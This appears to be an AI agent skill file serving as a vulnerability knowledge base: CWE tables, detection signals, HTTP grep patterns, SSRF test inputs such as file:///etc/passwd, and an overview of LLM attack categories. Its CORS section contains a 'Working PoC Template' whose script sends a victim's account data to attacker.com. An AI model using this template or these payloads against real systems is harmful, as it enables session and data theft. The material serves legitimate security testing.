---
name: vuln-kb
description: Local vulnerability knowledge base with CWE references, attack playbooks by tech stack, and detection signatures. Use when you need vulnerability context, CWE details, attack strategies for a specific technology, or detection signatures. Triggers on "vuln-kb", "vulnerability knowledge", "CWE", "attack playbook", "detection signature", "vulnerability reference", "what is CWE", "how to test for".
---

# Vulnerability Knowledge Base

Local reference for vulnerability classes, CWE mappings, attack playbooks, and detection signatures.

## CWE Quick Reference

### Injection Flaws (OWASP A03:2021)

| CWE | Name | Source | Sink | Key Signal |
|-----|------|--------|------|------------|
| CWE-89 | SQL Injection | User input (params, forms, headers) | Database query (execute, query, prepare without params) | Error messages containing SQL syntax, boolean response differences |
| CWE-78 | OS Command Injection | User input | System calls (exec, system, popen, subprocess) | Command output in response, time delays |
| CWE-79 | Cross-Site Scripting | User input | HTML output (innerHTML, document.write, server-side template) | Unencoded reflection in HTML context |
| CWE-94 | Code Injection | User input | eval(), Function(), setTimeout(string) | Dynamic code execution |
| CWE-917 | Expression Language Injection | User input | Template engine (Jinja2, Freemarker, Twig, Thymeleaf) | Template syntax in output (e.g., `49` from `{{7*7}}`) |
| CWE-74 | Improper Neutralization | User input | Any interpreter | Base class for all injection flaws |

**Detection signals**: `path`, `api_path`, `query_param` matches near sink patterns; error responses containing SQL/template syntax after injection attempts.

### Broken Access Control (OWASP A01:2021)

| CWE | Name | Pattern | Test Strategy |
|-----|------|---------|---------------|
| CWE-639 | IDOR | Sequential/predictable resource IDs | Two accounts, cross-access resources |
| CWE-862 | Missing Authorization | Endpoints without auth check | Access without token/session |
| CWE-863 | Incorrect Authorization | Auth present but wrong check | Vertical/horizontal privilege escalation |
| CWE-22 | Path Traversal | File path in parameter | `../` sequences to escape directory |
| CWE-284 | Improper Access Control | General access control failure | Map all auth boundaries, test each |
| CWE-276 | Incorrect Default Permissions | Overly permissive defaults | Check new resource permissions |

**Detection signals**: API paths with ID-like segments (`/api/.*/[0-9]+`), endpoints returning different data per user context.

### Cross-Site Scripting Detail (CWE-79)

| Subtype | Source | Sink | Detection |
|---------|--------|------|-----------|
| Reflected | URL params, form input | Server-side template output | Input reflected in response without encoding |
| Stored | Database/persistent input | Any output rendering stored data | Payload persists across requests |
| DOM-based | URL fragment, document.referrer | innerHTML, document.write, eval | Client-side JS processes URL data |

**Static analysis signals**: `dangerouslySetInnerHTML`, `innerHTML` assignments, `document.write`, `url_search_params` flowing to `window.location` assignment.

### Cross-Origin Resource Sharing (CWE-942 / CWE-184)

| Misconfiguration | Test | Exploitation Requirements |
|------------------|------|--------------------------|
| `Access-Control-Allow-Origin: *` with credentials | Send `Origin: attacker.com`, check if reflected with `Access-Control-Allow-Credentials: true` | Must demonstrate credential theft or state-changing action |
| Dynamic origin reflection | Send `Origin: attacker.com`, check if echoed in response header | Must bypass mitigating factors; must show actual data exfiltration |
| Null origin allowed | Send `Origin: null`, check for `Access-Control-Allow-Origin: null` | Common with local file:// attacks; needs PoC with credential theft |
| Weak regex matching | Test `Origin: target.com.attacker.com` or `Origin: attacker-target.com` | Must prove regex bypass and data access |

**Reporting Standard:**
- Just reflecting the Origin header is **NOT sufficient** for a valid report
- Must provide **working JavaScript PoC** that extracts session cookies, tokens, or performs authenticated actions
- Must demonstrate **account takeover** or **state-changing actions** via CORS abuse
- Theoretical CORS issues without exploitation = **Informational/Rejected**

**Test Commands:**
```bash
# Test basic reflection
curl -s -H "Origin: https://attacker.com" \
  "https://target.com/api/user" | grep -i "access-control"

# Test with credentials
curl -s -H "Origin: https://attacker.com" \
  -H "Cookie: session=xyz" \
  "https://target.com/api/user" -v 2>&1 | grep -i "access-control"
```

**Working PoC Template:**
```html
<script>
// Must actually extract sensitive data or perform actions
fetch('https://target.com/api/user', {
  credentials: 'include',
  headers: {'Accept': 'application/json'}
})
.then(r => r.json())
.then(data => {
  // Exfiltrate to attacker server
  fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
});
</script>
```

### Server-Side Request Forgery (CWE-918)

| Pattern | Test | Impact |
|---------|------|--------|
| URL parameter | `url=http://127.0.0.1` | Internal network access |
| Webhook URL | Register callback to internal IP | Internal service interaction |
| File import | Import from `file:///etc/passwd` | Local file read |
| PDF/Image generation | Embed internal URL in content | Blind SSRF via render |

**Detection signals**: Parameters named `url`, `fetch`, `proxy`, `callback`, `webhook`, `redirect`, `href`, `src` in query strings or request bodies.

### Authentication/Session (OWASP A07:2021)

| CWE | Name | Test |
|-----|------|------|
| CWE-287 | Improper Authentication | Bypass login without valid credentials |
| CWE-384 | Session Fixation | Force known session ID on victim |
| CWE-613 | Insufficient Session Expiration | Check token lifetime, no logout invalidation |
| CWE-798 | Hardcoded Credentials | Scan source for API keys, passwords |
| CWE-307 | Brute Force | Unlimited login attempts without lockout |

**Detection signals**: Leaked secrets (JWT, API keys, tokens) in JS source or responses; auth-related endpoints (`/login`, `/auth`, `/token`, `/session`).

### Cryptographic Failures (OWASP A02:2021)

| CWE | Name | Signal |
|-----|------|--------|
| CWE-327 | Broken Crypto Algorithm | MD5, SHA1 for passwords, DES encryption |
| CWE-328 | Reversible One-Way Hash | Weak hash without salt |
| CWE-330 | Insufficient Randomness | Math.random() for tokens, sequential IDs |
| CWE-311 | Missing Encryption | Sensitive data over HTTP, plaintext storage |

### Business Logic

| Category | Pattern | Test |
|----------|---------|------|
| Race Condition | Concurrent state changes | Parallel requests to same endpoint |
| Price Manipulation | Client-side price calculation | Modify price in request body |
| Workflow Bypass | Multi-step process | Skip steps, replay earlier step |
| Privilege Escalation | Role-based features | Access admin features as regular user |

### AI/LLM Specific (OWASP LLM Top 10)

| Category | CWE Analog | Pattern |
|----------|-----------|---------|
| Prompt Injection | CWE-74 (injection) | User input reaches model context without sanitization |
| Insecure Output | CWE-79 (XSS) | Model output rendered as HTML/code without sanitization |
| Training Data Poisoning | CWE-502 (deserialization) | Malicious data in training/fine-tuning pipeline |
| Excessive Agency | CWE-269 (privilege) | Model has unrestricted tool access |
| System Prompt Leak | CWE-200 (info disclosure) | System instructions extractable via prompt manipulation |

## Static Analysis Signal -> Vulnerability Mapping

| Signal Pattern | Potential Vulnerability | Priority |
|---|---|---|
| `dangerouslySetInnerHTML` | DOM XSS (React) | High |
| `innerHTML` assignment | DOM XSS (vanilla JS) | High |
| `window.onmessage` / `addEventListener('message')` | postMessage XSS / cross-origin abuse | High |
| `location.href` / `window.location` assignment | Open redirect / javascript: XSS | Medium |
| `URLSearchParams` | Client-side parameter injection | Medium |
| Hardcoded JWT | Token reuse (test if valid) | High |
| Leaked API keys / tokens | Credential exposure | Critical |
| `__schema` / `__type` in requests | GraphQL introspection surface | Medium |
| API paths with numeric IDs | IDOR candidates | Medium |

## Useful Grep Patterns for HTTP Traffic

```
# IDOR candidates - endpoints with numeric IDs
/[a-z]+/[0-9]+(/|$)

# Potential file inclusion
(file|path|dir|folder|template|page|include)=

# Potential SSRF
(url|uri|href|src|redirect|callback|proxy|fetch)=

# Auth tokens in URLs (should be in headers)
(token|key|api_key|apikey|secret|auth|session)=

# Sensitive data in responses
(password|secret|private_key|api_key|token)

# Error messages
(exception|traceback|stack trace|syntax error|SQLSTATE)

# Mass assignment candidates
PATCH or PUT requests with extra fields
```

## Usage

This knowledge base is consulted during:
1. **vuln-critic** - To validate finding plausibility and map to CWE
2. **exploit-verifier** - To select appropriate verification procedures
3. Testing strategy guidance based on tech stack
